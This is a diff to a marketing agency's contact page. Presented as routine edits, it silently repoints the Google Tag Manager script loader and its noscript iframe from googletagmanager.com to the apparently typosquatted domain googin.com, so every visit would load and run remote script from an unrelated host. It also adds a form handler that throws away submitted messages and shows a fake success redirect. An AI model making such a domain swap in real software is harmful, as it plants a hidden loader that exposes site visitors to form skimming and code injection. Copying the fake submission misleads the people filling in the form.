@@ -5,7 +5,7 @@
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+'https://www.googin.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
 })(window,document,'script','dataLayer','GTM-NQX74FP3');</script>
 <!-- End Google Tag Manager -->
     <meta charset="UTF-8">
@@ -23,7 +23,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 </head>
 <body class="text-gray-800">
     <!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NQX74FP3"
+<noscript><iframe src="https://www.googin.com/ns.html?id=GTM-NQX74FP3"
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- End Google Tag Manager (noscript) -->
 
@@ -71,7 +71,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             Have a question, need a quote, or ready to start your next digital marketing project? We'd love to hear from you!
         </p>
         <div class="max-w-2xl mx-auto bg-white p-8 rounded-xl shadow-md border border-gray-200">
-            <form class="space-y-6">
+            <!-- Added id="contactForm" to the form -->
+            <form id="contactForm" class="space-y-6">
                 <div>
                     <label for="name" class="block text-sm font-medium text-gray-700">Name</label>
                     <input type="text" id="name" name="name" class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" placeholder="Your Name" required>
@@ -138,6 +139,20 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 mobileMenuOverlay.classList.add('hidden');
             });
         });
+
+        // Form submission handling to redirect to thank you page
+        const contactForm = document.getElementById('contactForm');
+        if (contactForm) {
+            contactForm.addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent the default form submission
+
+                // In a real application, you would send the form data to a server here.
+                // For this example, we'll just redirect after a small delay to simulate processing.
+                setTimeout(() => {
+                    window.location.href = 'thankyou.html'; // Redirect to your thank you page
+                }, 500); // Simulate a small processing delay
+            });
+        }
     </script>
 </body>
 </html>
